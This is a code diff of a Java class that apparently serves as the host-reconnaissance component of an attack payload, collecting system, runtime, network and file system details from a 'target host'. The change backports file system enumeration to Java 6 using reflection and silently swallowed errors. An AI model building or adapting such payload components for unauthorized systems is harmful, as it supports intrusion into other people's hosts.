@@ -10,9 +10,7 @@ import java.lang.management.ThreadMXBean;
 import java.lang.reflect.Method;
 import java.net.InetAddress;
 import java.net.NetworkInterface;
-import java.nio.charset.StandardCharsets;
-import java.nio.file.FileStore;
-import java.nio.file.FileSystems;
+import java.nio.charset.Charset;
 import java.util.ArrayList;
 import java.util.Enumeration;
 import java.util.HashMap;
@@ -22,7 +20,7 @@ import java.util.Map;
 
 /**
  * 收集目标主机的硬件、操作系统、Java 运行时、网络、中间件和 Web 框架信息。
- * 保持独立 payload 约束。
+ * 保持 Java 6 字节码与独立 payload 约束。
  *
  * @author LeoSpring
  */
@@ -96,7 +94,7 @@ public class BasicInfoComponent implements Runnable {
     private String stringParam(String name, String fallback) {
         Object value = params == null ? null : params.get(name);
         if (value == null) return fallback;
-        if (value instanceof byte[]) return new String((byte[]) value, StandardCharsets.UTF_8);
+        if (value instanceof byte[]) return new String((byte[]) value, Charset.forName("UTF-8"));
         return String.valueOf(value);
     }
 
@@ -378,24 +376,49 @@ public class BasicInfoComponent implements Runnable {
         return userInfo;
     }
 
-    /** 获取当前 JVM 可见的文件系统存储。 */
+    /** Java 7+ FileStore 反射路径，Java 6 自动回退 File.listRoots。 */
     public List<Map<String, Object>> getFileSystemInfo() {
         List<Map<String, Object>> stores = new ArrayList<Map<String, Object>>();
         try {
-            for (FileStore store : FileSystems.getDefault().getFileStores()) {
-                if (stores.size() >= 256) break;
+            Class<?> fileSystemsClass = Class.forName("java.nio.file.FileSystems");
+            Class<?> fileSystemClass = Class.forName("java.nio.file.FileSystem");
+            Object fileSystem = fileSystemsClass.getMethod("getDefault").invoke(null);
+            Object iterable = fileSystemClass.getMethod("getFileStores").invoke(fileSystem);
+            Iterator<?> iterator = ((Iterable<?>) iterable).iterator();
+            Class<?> fileStoreClass = Class.forName("java.nio.file.FileStore");
+            while (iterator.hasNext() && stores.size() < 256) {
+                Object store = iterator.next();
                 Map<String, Object> info = new HashMap<String, Object>();
                 String storeText = String.valueOf(store);
                 String mount = fileStoreMount(storeText);
-                String name = store.name();
-                String fsType = store.type();
+                String name = String.valueOf(fileStoreClass.getMethod("name").invoke(store));
+                String fsType = String.valueOf(fileStoreClass.getMethod("type").invoke(store));
                 info.put("mount", mount);
                 info.put("name", name);
                 info.put("fsType", fsType);
-                addSpaceInfo(info, store.getTotalSpace(), store.getUsableSpace());
+                long total = ((Number) fileStoreClass.getMethod("getTotalSpace").invoke(store)).longValue();
+                long free = ((Number) fileStoreClass.getMethod("getUsableSpace").invoke(store)).longValue();
+                addSpaceInfo(info, total, free);
                 stores.add(info);
             }
-        } catch (Exception ignored) {
+        } catch (Throwable ignored) {
+            // Java 6 或受限运行时由 File.listRoots 路径接管。
+        }
+        if (!stores.isEmpty()) return stores;
+
+        File[] roots;
+        try { roots = File.listRoots(); } catch (Throwable ignored) { return stores; }
+        if (roots == null) return stores;
+        for (int i = 0; i < roots.length && stores.size() < 256; i++) {
+            File root = roots[i];
+            Map<String, Object> info = new HashMap<String, Object>();
+            info.put("mount", root.getPath());
+            info.put("name", root.getPath());
+            info.put("fsType", "File System");
+            long total = invokeLongMethod(root, File.class, "getTotalSpace", -1L);
+            long free = invokeLongMethod(root, File.class, "getUsableSpace", -1L);
+            addSpaceInfo(info, total, free);
+            stores.add(info);
         }
         return stores;
     }
@@ -674,7 +697,7 @@ public class BasicInfoComponent implements Runnable {
                 total += read;
                 if (total >= maxBytes) break;
             }
-            return new String(output.toByteArray(), StandardCharsets.UTF_8);
+            return new String(output.toByteArray(), Charset.forName("UTF-8"));
         } catch (Throwable ignored) {
             return null;
         } finally {
